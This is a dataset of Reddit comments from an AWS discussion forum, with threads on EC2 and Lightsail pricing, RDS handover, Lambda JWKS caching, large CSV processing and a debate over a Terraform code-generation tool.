g8mszj3,j9p5qq,"Why is having writes disabled during the upgrade process an acceptable solution for your team? If you ever wanted to move to daily/weekly upgrades, that means you either upset your customers once a week as the service is down, or you have to time it during the time of least activity and make your engineering team stay up after-hours to deal with it.

Also, having data live on EBS rather than S3 means you've got some major limits in trying to scale up the size of your database. Look at how Presto has managed to segregate the query engine and data storage -- that allows for some much more serious scaling.",1.0
g8o69wg,j9p5qq,"Disabling writes is neither desirable nor acceptable in the long term, but it is a pragmatic solution for us right now. The reason we went with this option is that our current users are not very sensitive to this problem, but I admit that it's a poor excuse and we're striving for a high availability solution. What I could have made more clear is that these updates are scheduled to run in a time-window once per week, configured per instance. The exception to the scheduled updates is when the ASG re-balances EC2 instances across AZs or when it replaces an unhealthy host, and both of these are very rare events.

We try to stay on top of what else is going on and how others take advantage of what's possible in the cloud. At the moment we're trying to solve a problem on a (by today's standards) modest scale. But thanks for the tip!",1.0
g8l0ygm,j9oxeb,"It's well hidden here [https://aws.amazon.com/ec2/pricing/on-demand/](https://aws.amazon.com/ec2/pricing/on-demand/) at the bottom:

&gt;*\*\* As part of AWS’s Free Usage tier, new AWS customers will receive free 15 GB of data transfer out each month aggregated across all AWS services for one year except in the AWS GovCloud Region.*",3.0
g8l61vl,j9oxeb,"Perfect, thank you :)",1.0
g8l2ai3,j9oxeb,"You get 15GB of free egress traffic per month.

Inbound traffic is free.

If you're worried about bandwidth then Lightsail offers equivalently sized instances for 5-12usd per month. But it comes with 2TB of data transfer included.",4.0
g8l65pu,j9oxeb,"Thank you. I will try to use as much as I can of the free vps I have before considering the Lightsail offer but it seems interesting so I'll keep it in mind.

EDIT: Ok so I looked for Lightsail offers and it's 3,50$ with 1 TB, I'm definitely buying it right now that's the best offer I could find&lt; 3

But I'm wondering something. Why is the server cheaper than the egress traffic I would pay if I had use a the free t2.micro amazon gives for free ?",2.0
g8lxx4z,j9oxeb,"Just make sure to heed [this warning](https://aws.amazon.com/service-terms/):

&gt;51.3. You may not use Amazon Lightsail in a manner intended to avoid incurring data fees from other Services (e.g., proxying network traffic from Services to the public internet or other destinations or excessive data processing through load balancing or content delivery network (CDN) Services as described in the Documentation), and if you do, we may throttle or suspend your data services or suspend your account.

If you're legit sending data out from services running on your instance, then you should be fine.

As for why they do it - ""competitive reasons"".  I imagine many people use it as I do - because the Free Tier is dangerous if you mess up, and Lightsail is a nice regular fee per month for good service provided.

Edit: And as always - make sure you run your day-to-day from a limited user and NOT the root account, because in the end you still have an AWS account that can use other services.  I really wish AWS would make more progress on granular permissions within Lightsail, but at least that's a relatively known quantity.",1.0
g8kwv8p,j9iong,"It depends. 

Invalidation and Static ETag would require a cronjob every minute to check if content is visible after a publishing date orr some sort of background job to regenerate the feed after an item is updated.

Invalidation on CloudFront is slow, and also brittle because the invalidation and availability need to be synchronized while we are dealing with the slow and opaque CloudFront invalidation mechanism (it becomes messy if you have multiple invalidations at once).

I'd go for an ETag calculated on the server, for example by hashing the visible ID's and modification dates.

Anyway, there is no single right answer so go with what works for you.",3.0
g8nfopz,j9iong,"&gt; Invalidation and Static ETag would require a cronjob every minute to check if content is visible after a publishing date orr some sort of background job to regenerate the feed after an item is updated.

At present, when you post a new position (in this case), it fires off an invalidation request to Cloudfront anyway.

The ETag is easy to calculate eiither when creating a static cache for S3, or when outputting the dynamic file from script. I guess I've just understood about ETag and wondered if it would help me more than the simple LastModified dates I've been using.",1.0
g8l91j2,j9iong,"Your RSS file is inherently dynamic, not static. I would bypass CloudFront altogether. If your concern is primarily around the CPU time to generate the file, generate the file and cache it as a physical file on your web servers, or in Redis, or using some other form of local caching.",0.0
g8nfeb1,j9iong,"My RSS file is inherently static, but changes every so often. It would be good to cache it in its static state.

&gt; generate the file and cache it as a physical file on your web servers

Absolutely; I can do that when someone publishes a new job (in the above example). Perhaps it's simpler to simply point this to S3 with a low max-age.",1.0
g8mp4p4,j9odvz,I believe they would conflict. I would recommend using Veeam to perform the migration instead.,1.0
g8ojawo,j9odvz,I'm getting a few disk consolidation warnings on the VMs I'm testing.,1.0
g8kper7,j9mm80,"Why are you using pageant?  You should be able to download the .PEM file, convert it to a .PPK using PuTTYgen. Then point to that PPK file in the PuTTY settings (Connection, SSH, Auth, Private key file for Authentication).

If you do need to use pageant, it should be available in your taskbar if it is running, right click on the taskbar icon and Add Key.",1.0
g8kq72q,j9mm80,Oh okay. I’ll check it,1.0
g8ks6cw,j9mde7,I'd say the announcement of AWS Snowmobile would belong in there,41.0
g8l2mcn,j9mde7,oh yes...when they drove that truck onto the stage...that place was going nuts,11.0
g8l8pg9,j9mde7,"in retrospect, that keynote blew away anything apple has done in their keynotes. 

a friggin' truck on stage.",2.0
g8ktp1d,j9mde7,Perfect suggestion! Thank you :) and added: https://awsvideocatalog.com/general/legendary/8vQmTZTq7nw,5.0
g8lo0a6,j9mde7,I told one of the older guys at work what it was and what it did. I showed him the video and he sat there pondering while looking visibly confused (like he usually does when faced with a conundrum). Amazing how far technology has come from his days to mine.,2.0
g8m708y,j9mde7,"I was surprised I had to scroll this far down to see this, but then I realized I was sorting by new lol. Def the most memorable keynote for me (though that may be because the content of services I actually use gets blended into my everyday dev life, and stand out less)",1.0
g8l24fq,j9mde7,"An old one, but the one where Hamilton revealed that AWS lay their underwater cables came to mind

https://youtu.be/AyOAjFNPAbA",19.0
g8l748p,j9mde7,"&gt; https://youtu.be/AyOAjFNPAbA

Thx, the most legendary fo them all :), but already had this one: https://awsvideocatalog.com/general/legendary/AyOAjFNPAbA",1.0
g8l30i6,j9mde7,Any public talk by James Hamilton,12.0
g8l7nre,j9mde7,Amen :D,3.0
g8lhm14,j9mde7,Now you're preachin' to the choir! :),2.0
g8l6o3q,j9mde7,"Not a keynote but a very good talk in dynamodb
https://youtu.be/HaEPXoXVf2k",8.0
g8l90ic,j9mde7,That talk is a religious experience,7.0
g8lhk1c,j9mde7,"I love this talk, especially the history of data management and how we got to NoSQL.",5.0
g8macea,j9mde7,"Now that some time passed... it is not a keynote, it is not legendary, but is quite special... if I had to group more of this type of videos together, how would you call this category?",2.0
g8navi0,j9mde7,Must watch.,3.0
g8l7mai,j9mde7,Not a Keynote. Next! ;),-3.0
g8l2gob,j9mde7,"The announcement of Aurora.  That was a stunner.  Not so stunning now that I use it every day, but back in 2014? my mind was blown.

[https://www.youtube.com/watch?v=GRm1fA42Z58](https://www.youtube.com/watch?v=GRm1fA42Z58)",5.0
g8l7jsk,j9mde7,"Falling a sleep, not legendary ;)",-7.0
g8lsew3,j9mde7,Lol your replies are killing me 😂,4.0
g8ma0fu,j9mde7,And they say you can't do jokes on-line 🤪,0.0
g8l781z,j9mde7,"I always go back to these two   
[https://www.youtube.com/watch?v=Zd5hsL-JNY4](https://www.youtube.com/watch?v=Zd5hsL-JNY4)  
and   
[https://www.youtube.com/watch?v=zmMpgbIhCpw](https://www.youtube.com/watch?v=zmMpgbIhCpw)",6.0
g8lofz2,j9mde7,"Yeah, Day in the Life was the first kind of mic drop I remember.  Nitro was the other (Comet/Vixen).  So many folks just thought AWS was building/running any other 'VPS' provider style infrastructure, and that was the first 'oh, they put way more into this than others'...",3.0
g8lh7wr,j9mde7,Eric is such a great speaker...I can understand complex topics when he presents them.,1.0
g8l52n1,j9mde7,SageMaker Studio,1.0
g8k7sie,j9j7ua,You need to create security group rules to allow the traffic,5.0
g8k8qx2,j9j7ua,Ahh. That worked. Thank you.,1.0
g8k655s,j9j7ua,Check security groups and ensure both subnets you specified in the subnet group are connected to an internet gateway.,2.0
g8jxv36,j9idd7,"The only thing I've changed about the instance lately is that the attached volume/hard disk is relatively full, but there are several hundred megabytes still free.",1.0
g8k1t7c,j9idd7,"A number of things could be happening:

1. CPU usage over a sustained 10% level could be using up the CPU credits, causing unresponsiveness. Have you checked whether any processes are using lots of CPU? 

2. Problematic hardware could possibly be causing an issue. Can you start a new instance and move the EBS volume over?",3.0
g8kcoe6,j9idd7,"In addition to the CPU, the memory on a t2.mirco is limited and maxing that out would also present as freezing/crashing.",3.0
g8kdkyc,j9idd7,"We had similar-sounding issues with low-end t2 instances some time ago. When t3 showed up on the scene, we switched, and they did not display the same pattern of periodic freezing.",1.0
g8kjxqe,j9idd7,"on a micro instances most probably the memory gets full and you dont have swap enabled, thus the instance freezes with no access and aws check is reporting a problem. happened often 😁",1.0
g8kusdv,j9idd7,"I would turn on detailed monitoring and see if that shows you anything unusual prior to the crash. Normal monitoring runs on a 5-minute window, so that might not be enough to catch anything anomalous. Detailed monitoring works on a 1 minute window, so that gives you a better chance of catching at least some symptoms of what's going on",1.0
g8n0egv,j9idd7,"To narrow your scope, it has nothing to do with it being a spot instance. If amazon wanted/needed it back, it gets shut down completely. Outside of that, it acts just like any other normal instance. It sounds like you have some resource problem with the programs running on your instance. Perhaps your bot or other program has a memory leak that gradually uses up all the memory in the instance?",1.0
g8n7595,j9idd7,"Okay. I figured it was something else since Amazon never contacted me about needing to shut mine down. It’s in python, so there shouldn’t be any memory leaks, but good idea. It seemed alright today, but what I’m probably gonna do is delete the code and download it fresh. I’ll also learn some of the techniques to get better monitoring data, to see if I am running out of RAM for some other reason, for example. Thanks!",1.0
g8n8q8v,j9idd7,"&gt;It’s in python, so there shouldn’t be any memory leaks

Trust me, python is very very much not immune to memory leaks ;)",1.0
g8k933m,j9hsu4,"Create a manual snapshot of the RDS instance, share it with the customer's account and have them restore it as a new instance in their own account.",3.0
g8jzt3t,j9hsu4,"Why does it need to be in your account? How will you provide connectivity? Why can't it be in their account or an account they own that is independent of their other accounts from day 1?

Putting aside how bad of an idea this seems, here are some options:

1. When it's time to hand over, export a backup and send it to he client via S3 then import it on their rds instance.
2. Use a new AWS account and 'give' the account to the client. (I don't recommend this).",3.0
g8kmvmw,j9hsu4,Why do you not recommend the second? That's what we did in the agency I worked before. Each client got its own account and when they would terminate the contract it's a super simple handover.,1.0
g8k6c0r,j9hsu4,"You can use DMS to replicate it over, but I don’t recommend starting it on your personal account as its a pain to transfer later. Start a fresh account, let the client put MFA on its root user, then make an IAM user for yourself to manage the instance.",1.0
g8kgkt4,j9hsu4,Do it in the client's account in the first place? You really shouldn't be working on someone's business (with their data presumably) in your account.,1.0
g8kmsbe,j9hsu4,Create a separate AWS account for the client and do it there. Then you can handover just the account,1.0
g8jxmcm,j9htp4,"Cloud watch events, S3, and lambda?",1.0
g8kc5wa,j9htp4,yep experimenting with drooping the file in S3 and then using Glue and lambda but the code is killing me :),1.0
g8l87w8,j9htp4,I don’t know that you need glue.,1.0
g8l8qin,j9htp4,"Right, just exploring and following online examples",1.0
g8jmolx,j9g3z1,"An encrypted Redis that only your Lambda has access to sounds reasonable.

See also ""take advantage of execution context reuse to improve the performance of your function"" at https://docs.aws.amazon.com/lambda/latest/dg/best-practices.html - you can cache in memory with a singleton or similar and it'll be reused across executions. That obviously has security implications when you're talking per user data (since user B will see the data for user A), but in this case the keys are the same for every user.",2.0
g8jp49n,j9g3z1,"Yeah, these are going to be public keys anyway. Put’em on a billboard in Times Square, doesn’t matter.",5.0
g8jxn5g,j9g3z1,"Yeah I was thinking about how to keep it in memory. I'm writing mine in Ruby, and I did a quick test to see if the class I made was getting instantiated (so that I could store the keys in class properties), but apparently not. There's probably another way to implement it, just have to fiddle around with it and verify that consecutive calls to the Lambda are reusing the data.

As for Redis, any reason to recommend that over say S3? Since it's just public keys, I didn't put any effort into encryption.",1.0
g8kab9i,j9g3z1,"Yeah ignore the encryption bit, /u/mr_grey corrected my brain fart, they're public keys.

S3 isn't really designed to be a cache or used for transient data, for a start latency will be in the low hundreds of milliseconds compare to low hundreds of microseconds for Redis, and update writes are only eventually consistent. I'm sure you could use it that way if your request volume is low enough, it's just not designed for it.",1.0
g8joeh0,j9g3z1,"I don’t think I fully understand the question...API gateway will cache a token for a while, I have mine set to 5 min...meaning that if the same token is sent in in that period, API Gateway will return the previous IAM policy that was sent before.",1.0
g8joy1m,j9g3z1,"I think I may understand now...in my Lambda authorizer, I call my Oauth source outside of the Lambda handler to get my keys, which puts it in global memory for the Lambda. You can add a time element into that and just check the time element on whether or not to query it again. However, if the Lambda dies, it’ll all get wiped out, but that means it wasn’t getting called on the regular anyway.",1.0
g8jxqqh,j9g3z1,"Same as the other comment, yeah I agree with the memory caching. Thanks!",1.0
g8k9dor,j9g3z1,"They keys in JWKS are public, not private - so you don’t need to protect the confidentiality of them, you only need to make sure someone can’t modify the JWKS/Man in the middle between your Verifier and JWKS.

S3 seems like a decent option if you want to really avoid reaching out to your oauth provider. What’s most important is you limit who could modify that copy of your jwks.

Caching a jwt as valid for 5 minutes from last sight is a pretty common behaviour as well, as another commenter pointed out. They will make the API very responsive.

I hope this helps.",1.0
g8jgclx,j9eby8,"Would you consider splitting the files? You may have to propagate the header, but if the rows are independent then why not. Of course it depends on your long term goals, but if I had a working solution that only failed because of long files I’d consider the lazy solution of splitting.

Otherwise I might go for EMR because I find Apache Spark very flexible. Or I’d consider some UDFs with Athena because it requires so little management overhead compared to starting up EMR cluster with Spark.",7.0
g8kmosw,j9eby8,"I did consider splitting up of CSVs, but due to some reasons, it would be adding more overhead to the problem and also  isn't a truly scalable solution.

Also, any particular reason you would recommend EMR over Glue, as Glue also leverages Spark for achieving the results, and being a server-less solution, it kind of attracts me more",1.0
g8jt7u9,j9eby8,"I've had good experience with Glue. This is Spark's bread n butter, so Glue would make sense.",2.0
g8jq8e4,j9eby8,I think Glue might work,1.0
g8kjt75,j9eby8,"any supporting reason on Why Glue would be better, or why Batch or EMR wouldn't work? as I'm new to all of them, and from the bird's eye view, all of them seems to do the job.",1.0
g8jsbse,j9eby8,"Could use Athena with federated query for the extra data.
Or Glue or sagemaker processing, AWS batch.... Take your pick",1.0
g8k0ed4,j9eby8,"From a greenfield perspective, Glue is probably the way to go, writing the transformed data out in the parquet format for more efficient ingestion by analytics tools (especially Athena).

Given that you already have code that does what you want, it may be easiest to package it as a Docker image and run it in Fargate, which will give you as much runtime as you need and much more memory than Lambda.",1.0
g8k16cm,j9eby8,"I was just reading today about how Julia can supposedly read CSV files 10x faster than python and R. I don’t know what to do with this information, but it might be interesting to you. I don’t know how it handles bulky files, and I’m not sure you can even run it in a Lambda without building support yourself.  https://news.ycombinator.com/item?id=24746057&amp;ref=hvper.com",1.0
g8kuods,j9eby8,I would suggest AWS batch. I have used it before to do basically the same thing you are describing.,1.0
g8kxtp7,j9eby8,"u/gamename, any particular observations that made you go with AWS Batch?",1.0
g8lmoyf,j9eby8,"Good question. The process required me to read a CSV file, do some additional processing, then output the processing to another CSV file. It was a very finite process. That's what decided me to use AWS batch. It was a well-defined workstream.  Hope that makes sense",1.0
g8moawc,j9eby8,"I tried Glue about 5 years ago I think, maybe before it was easy to edit the spark code. Sure looks like it might meet your needs.",1.0
g8nd8og,j9eby8,"I recently successfully used Batch for processing bigger CSV files (~1.2 million records each). We get files sent to an S3 bucket daily which we then queue up in Batch for enrichment with both vector and raster geospatial datasets. We initially went with Batch due to a lack of knowledge with Spark and associated libraries like GeoMesa/GeoTrellis but it has worked out well. We get ~120 files per day and Batch handles everything fine. Aside from the odd error (which so far has been due to the vendor files occasionally having a weird record), Batch has been humming along with the daily file dump that we get.",1.0
g8k0j7a,j9eby8,"I have no idea if this is the best option, but why not:

1. Upload to s3
1. Spin up a Postgres Aurora or RDS (or similar db)
1. Load the csv into a table
1. SQL to transform as needed
1. Export new file back to s3
1. Tear down the dB until next time

For your external api calls, I suppose this would not help.",0.0
g8kjfgn,j9eby8,"would this approach be feasible for heavy number of requests? I mean why do I need to store the data into db, wouldn't just extracting that out in a data frame and doing the operations would work? wouldn't need to spin up and tear down db every time",1.0
g8jebxx,j9dsgu,So the AD Connector is designed to link to an existing Active Directory setup. Not Google DNS. I would setup a “Simple AD” instead of this is just for spinning up a couple of Workspaces.,2.0
g8kkvhw,j9dsgu,"Got it, I tried to setup Simple AD but for London region it's not available as an option at all.

Since I don't have existing directory this is then not possible?",1.0
g8kqdcz,j9dsgu,"You can either spin up a Microsoft AD service which is a bit more expensive but should be available, or spin simple AD (and your Workspaces) up in Ireland?",1.0
g8jfx1r,j9dp95,"Yo dawg, heard you like abstraction layers...",38.0
g8kby9n,j9dp95,Infrastructure as code.... as code,15.0
g8mkcqr,j9dp95,"Yeah.. the abstraction layers are getting dumb.

I've seen folks trying to generate kubernetes clusters via helm from terraform


Folks.. look at Pulumi and stop trying to ' fix' terraform for advanced infrastructure.


If you're more than 3 layers deep you're doing it wrong.

Run your infrastructure, learn kubectl and apply your kubernetes manifests. Simple",2.0
g8j9fu5,j9dp95,"Why should I use this over terraform, and add another layer of potential compatability problems between this and terraform? There can already be some weird situations between terraform and the aws apis.",33.0
g8jckgm,j9dp95,So you don’t have to write it by hand?,10.0
g8jkjdj,j9dp95,Yes. Learning experience on what config is available. Terraform is straightforward once you figure the syntax out.,4.0
g8jy6o4,j9dp95,"Yeah but it’s time consuming. If I have manually administered environments and I want to switch to an IaC approach, it’s much easier to have a utility that can create an IaC snapshot of what I currently have rather than spending weeks writing the scripts from scratch and painstakingly debugging them to make sure every security group and routing rule perfectly mirrors what’s deployed.",3.0
g8jyj8s,j9dp95,Ah good point. I was thinking of the fresh start approach.,1.0
g8k44xu,j9dp95,"I've read most of the Ruby and Python SDK docs for maybe the top 10+ services of AWS relatively end to end. If I were to study terraform rather than quickly mock configs,  to address ""learning experience"" I'd learn terraform, but I'm confident I wouldn't learn something the API docs haven't taught me.",1.0
g8jfc7t,j9dp95,"Save you time, you wind up tuning it by hand but man it would be great to not have to discover everything from scratch for large infrastructures.",5.0
g8jita6,j9dp95,"if you use modules, you don't have to ""discover everything from scratch.""  It's kind of the point of modules.

And frankly, all IaC is tuned by hand.   It's just part of the job.",8.0
g8kbhbv,j9dp95,"No, imagine you walk into a new job that has a lot of infra, none of it as code and you need to convert it to terraform.

This is a godsend.",-2.0
g8kidk1,j9dp95,"Except that's not what this tool does. This creates new infrastructure from scratch, i.e. generates terraform code from a template, not from currently deployed infrastructure. What you are looking for is something like https://github.com/dtan4/terraforming",7.0
g8ktlgo,j9dp95,"Ay thanks dude this is what I need. Been working backwards for a company on a ton of existing infra. You can only run a plan so many times waiting for no changes before you wanna die 

This OP is dumb. It’s just terraform modules with another layer",5.0
g8kwa04,j9dp95,"There are a couple of different tools for importing existing infrastructure and I didn't find a ""one fits all"" solution just yet. I've used [terraforming](https://github.com/dtan4/terraforming) and [terraformer](https://github.com/GoogleCloudPlatform/terraformer) so far (and even wrote my own for cloudflare stuff once, although there is [an official one now](https://github.com/cloudflare/cf-terraforming)) - both work well enough, but you'll still need manual shuffling around nonetheless and sometimes it's easier to just redeploy from scratch without importing. But it does help a lot to just see what's around.

&gt; This OP is dumb. It’s just terraform modules with another layer

I agree - it's basically an AWS-only template library, but there's already an official registry for modules for many different providers, not just AWS.",2.0
g8lvkmp,j9dp95,"Ya, which is why I don’t get this tool. Even if it didn’t cost money, there’s a lot of free community modules.

I think I this is just strictly for teams with no TF experience whatsoever. I can see the benefit for a early-stage startup with devs but no TF experience (or even AWS). It’s cheaper than heroku and on AWS, in case you need to scale up one day. But I guess very niche",2.0
g8mmicz,j9dp95,"Got it, yeah this is stupid then.",1.0
g8lv84z,j9dp95,Where does it say it will manage existing resources for you?,1.0
g8mmfj8,j9dp95,It doesn’t. I was wrong this is lame.,2.0
g8k9i3o,j9dp95,"...said every engineer to just about any new abstraction of a thing.

The fact is, it won't be long before writing IaC is on the rear view mirror and we're just moving icons around on the screen to build architecture so devs can focus on what really matters.",1.0
g8lvms4,j9dp95,Perhaps one day,1.0
g8n1j0k,j9dp95,"Ok, sure. But at the same time. There have probably been far more abstraction layers that people have thought up, than abstraction layers that are genuinely useful and widely adopted.

So sell me.",-1.0
g8k2ebd,j9dp95,"""why should I use this over terraform"" - it's your wish 🙂 so if someone who is expert on TF, and they don't want to do the same stuff again and again, they can utilize this, or someone who don't want to learn TF and they need a simple infra immediately, they will get benefit from it. 

My my point of view, I don't get any benefit from this due to xyz reasons but I  encourage the effort they put to create this. It's one type of contribution to the AWS community.",1.0
g8jrtp8,j9dp95,Why would you use Terraform to begin with instead of Cloudformation?,-12.0
g8jur1k,j9dp95,"&gt;	Why would you use Terraform to begin with instead of ~~Cloudformation~~ CDK

ftfy",7.0
g8k3am0,j9dp95,"This is what i was thinking. If your making this choice its most likely a new project. CDK is developed in a way were abstractions dont necessarily have to be waited on. You can build your own with raw constructs.

One reason not use CDK is vendor lock in. But cdk terraform is a thing. So its probably gonna become the standard even for any cloud.",4.0
g8khsz4,j9dp95,"I'm quite enjoying CDK,  definitely far more than I enjoyed CF. Just being able to write 

    const role = new iam.Role('bla');
    someKinesisStm.grantWrite(role);

Is really nice. The biggest hassle I had was wrapping my head around API Gateway and the whole method request/response mapping vs. integration request/response mapping (and deployments and stages).

But CDK didn't get in my way dealing with this new problem domain, plus the IDE support makes it a lot more discoverable.",2.0
g8k0si0,j9dp95,"There you go, that's more like it.",1.0
g8jvtzh,j9dp95,"&gt; Why wouldnt you use Cloudformation?

because you have self respect.  CFormation was uglier than sin before YAML support, but now it's just slow to get new features and difficult to use with anything non-AWS related.


Cformation is a good idea executed poorly. At best, it's primary value to AWS is that it gives their sales guys a relatively easy way for novices to follow along w/ some guide or tutorial.

""It's way too many clicks in the console and. a lot of screenshots I don't want to make... so just copy the JSON below and change a few of the values as you need to and bam! you've got yourself a $thing_that_blog_was_written_about""",6.0
g8k09wc,j9dp95,"That's hilarious.  It's literally how AWS run their entire infrastructure.  One of the biggest companies in the world. Along with tons of other large companies.  

I think you've drank some sort of Kool Aid maybe?",-2.0
g8k696b,j9dp95,"&gt;  It's literally how AWS run their entire infrastructure. 

A) no, it isn't and B) I know multiple amazon employees/teams that use TF and loath Cformation for most of the same reasons I do.

&gt;  Along with tons of other large companies.

That's not necessarily the 'good thing' you think it is.

&gt; I think you've drank some sort of Kool Aid maybe? 

I've used both and libcloud and all the chef/ansible...etc attempts that have popped up the last 10 years.

They're all bad in their own way, but Cformation a dumpster fire. If it works for you, i'm glad it suits your needs. For the rest of us, it's a joke.


**edit** typos.",4.0
g8nc797,j9dp95,"

&gt;	B) I know multiple amazon employees/teams that use TF and loath Cformation for most of the same reasons I do.

Correct. A close friend of mine works for AWS, and he’s signaled that many are disappointed with CFN internally.",1.0
g8ku2j2,j9dp95,"I’ve worked at companies with multiple cloud resources on different platforms. TF lets you manage everything with one IaC service 

If you are a full blown AWS shop, use CDK",3.0
g8kkoch,j9dp95,So you mean something like cdktf?,4.0
g8mztm1,j9dp95,"That just cdk for terraform. It's already a thing.


More things is always better right? /S",1.0
g8km46l,j9dp95,So basically the same as cdk constructs,3.0
g8jhg6x,j9dp95,Sounds like a terraform module. Why wouldn’t I just use those?,7.0
g8l5xvk,j9dp95,"Nice job, but useless tool.",2.0
g8lxx2d,j9dp95,"Yeah, we wrote one of these too. Everyone who's written an abstraction layer for Terraform eventually figures out why it's a bad idea, and everyone who's used one from some single dev somewhere instead of an actual company/community has discovered what life is like when the project gets abandoned and you have to either become the maintainer or rewrite everything without it.

TF12 does virtually everything, this isn't necessary, but if it brings you joy and you learn something by writing it then I'm happy for you anyway.",2.0
g8lw6ri,j9dp95,"Damn, AWS redditors are flaming this. Makes sense, it’s not really built for people already skilled with IaC. Look at this post also from OP: https://www.reddit.com/r/SideProject/comments/ixro4u/

I think the takeaway is that if you don’t know any IaC, this must feel like a godsend. Gets you on AWS without having to learn anything about IaC, with the option to upgrade to TF when you’re ready to scale up. That’s probably it’s use case. Similar to heroku but cheaper and more long-term.",1.0
g8mktlq,j9dp95,"If you don't know IaC, learn it.
If you don't know programming, learn it.
If you don't know system administration, learn it.

If you don't want to learn anything, you're in the wrong industry.

Frontend developers aren't sysadmins, devops, or backend developers. Assuming they are is dangerous.",1.0
g8nml8l,j9dp95,"Your last paragraph agrees with what I just said. If your startup only has front end devs, they aren’t sysadmins or devops so they don’t know how to use TF or any other IaC.

Yes, on an individual level, I agree devs should learn IaC but for a startup, they can’t just wait until they skill that up. Even 1 month can kill an early-stage startup, assuming it only takes 1 month to completely know what you’re doing.",1.0
g8ns6rt,j9dp95,"Oh. I don't disagree. Minimum viable product is important.

However I've seen a lot of companies try to ""reset"" saying they're working towards their minimum viable product when they have a bunch of revenue in place from other product lines.

When you play it fast and loose, you make compromises and collect tech debt. You can't shuffle that tech debt under a rug somewhere and try to forget about it. I've seen this cycle so much lately :-(.  After MVP,  management doesn't want to spend the same kind of cash on development since they 'have their golden egg'

This is how big compromises happen, and this is how catestrophic infrastructure failure happens.

The more classical backend/sysadmin first model puts more value on a strong/scalable/secure foundation, but doesn't get a MVP as fast.


It's always fewer human hours to do the foundations correctly, then build great frontends on robust backends. Trying to 'redo backends' because they were rushed along always ends up costing double and triple the human hours, and creating an 'unreliable period' for your big product.",1.0
g8nsbcg,j9dp95,"I don’t disagree with you. At least this product outputs TF code so I doubt it’s really bad tech debt, but we’ll have to wait and see.",1.0
g8o6suj,j9dp95,"Higher-level tooling written on cdktf? Interested to see how it plays out ...

Does cdktf deploy Lambdas to do AWS API calls like CDK does to get around the fact it doesn't have a proper session with AWS? Or it doesn't look like cdktf has started to tackle the higher-level constructs that CDK has?",1.0
g8jj3eb,j9dp95,"Oh yeah, it's  cash grab around versioned TF.

Folks, if you have TF and a github account, you've got this.",1.0
g8jrve7,j9dp95,Wow.  This is such a bad idea.,0.0
g8jtid8,j9dp95,"Sounds like generationception, I think I’ll pass.",1.0
g8j6fbl,j9dp95,"So this is a tool that generates terraform, terraform is a tool that generates cloud formation, and cloud formation is a tool that generates resources inside of AWS.

If we keep at it we can transpile back end code as much as front end coders.",-25.0
g8j98eb,j9dp95,"Terraform doesn’t generate CloudFormation, it calls the AWS API directly.",43.0
g8jr6cp,j9dp95,"Ah just finding out that it does the exact same thing Cloudformation does.
So instead of transpiling to a product made by AWS you actually add an unnecessary third party into the mix that ALL of your code relies on.
That seems crazy to me.",-12.0
g8ju36l,j9dp95,"Terraform isn't AWS specific for one, and it has a different view on state management than Cloudformation.",7.0
g8k0wfj,j9dp95,"It's not AWS specific in theory but I bet that very few services are cross compatible, so you end up writing two versions of the code anyway, except in some third party language not provided by the cloud vendor.",0.0
g8kzvdi,j9dp95,"What do you mean ""in theory""? It's demonstrably cloud agnostic and supports all sorts of other stuff. Yah of course you have to write different resources for different clouds. Terraform is 'state management for anything with an api'. Cloudformation is 'AWS state management'. 

This is a dumb hill to die on.",2.0
g8juzhg,j9dp95,"The funny thing about Terraform is that it's only kinda third party, in that AWS maintains the AWS provider, and the AWS Terraform provider often supports new AWS APIs before CloudFormation does. 

But like the other poster said, the handy part is that it supports a ton of APIs. So you can use it for GCP and Azure, sure -- but even when you're at AWS, you can use it for the rest of your cloud ecosystem. Deploy the EKS cluster, but also use the same tool to configure Kubernetes itself, Datadog integration, your PagerDuty services, Splunk, and so on.

Or write one module that your devs can use to spin up the same cluster in two cloud providers, and so on.",5.0
g8k0ny2,j9dp95,"I'd be very curious to see the number of services that are ACTUALLY cross compatible.  I imagine EKS is very different from GKE, hell I imagine load balancers are very different.  

So you end up writing multiple versions anyway just in Terraform instead of the cloud vendor provided language.

Just seems like a waste.",1.0
g8jfhfw,j9dp95,Also you have no idea what you’re talking about.,12.0
g8jcq28,j9dp95,Terraform does not generate CloudFormation.,8.0
g8jr7am,j9dp95,"Ah just finding out that it does the exact same thing Cloudformation does.
So instead of transpiling to a product made by AWS you actually add an unnecessary third party into the mix that ALL of your code relies on.
That seems even crazier to me.",-6.0
g8jh4mf,j9dp95,"&gt;terraform is a tool that generates cloud formation

I think you're thinking of [Troposphere](https://github.com/cloudtools/troposphere)",6.0
g8jrlh9,j9dp95,"So this is like Troposphere except instead of generating Cloudformation, it generates another third parties code.
Just wow.",0.0
g8j7078,j9dp95,"You can convert Terraform to Cloudformation, but it's not how it works. But agree on the framework point.",1.0
g8jpojg,j9dp95,"Terraform fans get really mad if you mention anything cloud formation and terraform in the same sentence.  Also, terraform doesn’t use CF.  They roll their own state/deployment.",-1.0
g8jrmg0,j9dp95,Very sensitive group!,2.0
g8ju6of,j9dp95,You seem to be the one with an issue my friend.,3.0
g8k13zr,j9dp95,Just pointing out the senselessness of it all. Ya'll can have fun doing what you want.,1.0
g8kiaat,j9dp95,You're more pointing out your lack of understanding.,3.0
g8k35zp,j9dp95,"Definitely not ""just"" but if you want to come off as a sour puss, have fun doing what YOU want",3.0
g8ja91z,j9dp95,Confirmed. We all hate writing terraform,-10.0
g8jhncb,j9dp95,"Compared to every other option, I love it.",9.0
g8ju8tq,j9dp95,Yea I hate writing cloudformation. Different strokes basically,2.0
g8k6uzb,j9dp95,CloudFormation just feels so verbose.,2.0
g8ka5yq,j9dp95,I agree with that sentiment. I wrote Terraform for a year and moved to CloudFormation and that was the first thing I thought.,1.0
g8kan4i,j9dp95,"Agreed. Powerful and incredibly useful given its integration with the platform, but a pain to write.",1.0
g8jvae9,j9dp95,.,-1.0
g8iy1w0,j9d70z,Can you share any of your code? Is any of your infrastructure in CloudFormation/CDK/TF? CDKhas constructs for a load-balanced Fargate service that might be helpful to reference.,3.0
g8jbbk1,j9d70z,"No I deployed it all from the AWS CLI and setup the LB manually. I think it has something to do with my port configurations, which I’m not very well versed in",2.0
g8j4b0c,j9d70z,Is the LB in the right VPC?,3.0
g8j5ngi,j9d70z,Yeah it’s pointed at the correct VPC and subnets,2.0
g8jcfky,j9d70z,Check that the LB healthcheck port is allowed in security group.,3.0
g8j4cp6,j9d70z,You probably have not setup your LB and TGs in the correct way. Make sure that the Target Group have the correct routes set so they redirect requestes to the actual container.,3.0
g8jbrlu,j9d70z,You also need to make sure all the ports line up correctly. Defined in task definition and in the TG health check settings.,3.0
